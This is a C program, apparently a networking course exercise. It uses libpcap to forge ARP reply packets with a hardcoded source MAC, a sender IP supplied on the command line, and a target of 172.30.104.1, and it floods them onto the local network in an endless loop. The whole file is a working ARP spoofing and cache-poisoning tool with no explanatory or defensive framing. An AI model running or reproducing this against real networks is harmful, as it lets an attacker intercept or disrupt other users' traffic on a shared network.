#include "../cn.h"
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <net/if_arp.h>

struct arphdr1
{
    unsigned short int ar_hrd;		/* Format of hardware address.  */
    unsigned short int ar_pro;		/* Format of protocol address.  */
    unsigned char ar_hln;		/* Length of hardware address.  */
    unsigned char ar_pln;		/* Length of protocol address.  */
    unsigned short int ar_op;		/* ARP opcode (command).  */
    unsigned char __ar_sha[6];	/* Sender hardware address.  */
    unsigned char __ar_sip[4];		/* Sender IP address.  */
    unsigned char __ar_tha[6];	/* Target hardware address.  */
    unsigned char __ar_tip[4];		/* Target IP address.  */
};

int main(int argc, char const *argv[])
{
	char* device;
	char error[PCAP_ERRBUF_SIZE];
	device = pcap_lookupdev(error);
	if(device==NULL) 
	{
		printf("Could not find a device: %s",error);exit(0);
	}
	else
	{
		printf("Device: %s\n",device);
	}
	pcap_t *handle;
	int timeout = 1000;
	handle = pcap_open_live(device,BUFSIZ,0,timeout,error);
	if(handle==NULL)
	{
		printf("Could not find a handle: %s",error);exit(0);
	}
	u_char* packet;
	packet = (u_char*)malloc(sizeof(u_char)*1500); 
	struct ether_header* eth;
	eth = (struct ether_header*)packet; 
	struct arphdr1* arph; // 
	arph = (struct arphdr1*)(packet+14);

	arph->ar_hrd = htons(1);
	arph->ar_pro = 8;
	arph->ar_hln = 6;
	arph->ar_pln = 4;

	arph->ar_op = htons(2);

	// e4:e7:49:0f:cd:31

	arph->__ar_sha[0] = eth->ether_shost[0] = 0xE4;//
	arph->__ar_sha[1] = eth->ether_shost[1] = 0xE7;//
	arph->__ar_sha[2] = eth->ether_shost[2] = 0x49;//
	arph->__ar_sha[3] = eth->ether_shost[3] = 0x0F;//
	arph->__ar_sha[4] = eth->ether_shost[4] = 0xCD;//
	arph->__ar_sha[5] = eth->ether_shost[5] = 0x31;//
	//00:25:83:70:10:00
	arph->__ar_tha[0] = eth->ether_dhost[0] = 0x00;//
	arph->__ar_tha[1] = eth->ether_dhost[1] = 0x25;//
	arph->__ar_tha[2] = eth->ether_dhost[2] = 0x83;//
	arph->__ar_tha[3] = eth->ether_dhost[3] = 0x70;//
	arph->__ar_tha[4] = eth->ether_dhost[4] = 0x10;//
	arph->__ar_tha[5] = eth->ether_dhost[5] = 0x00;//

	eth->ether_type = htons(ETHERTYPE_ARP);

	arph->__ar_sip[0] = atoi(argv[1]);
	arph->__ar_sip[1] = atoi(argv[2]);
	arph->__ar_sip[2] = atoi(argv[3]);
	arph->__ar_sip[3] = atoi(argv[4]);

	arph->__ar_tip[0] = 172;
	arph->__ar_tip[1] = 30;
	arph->__ar_tip[2] = 104;
	arph->__ar_tip[3] = 1;



	while(1)
	{
		if(pcap_inject(handle,packet,44)<=0)
		{
			perror("Could not send");
		}
	}

	return 0;
}
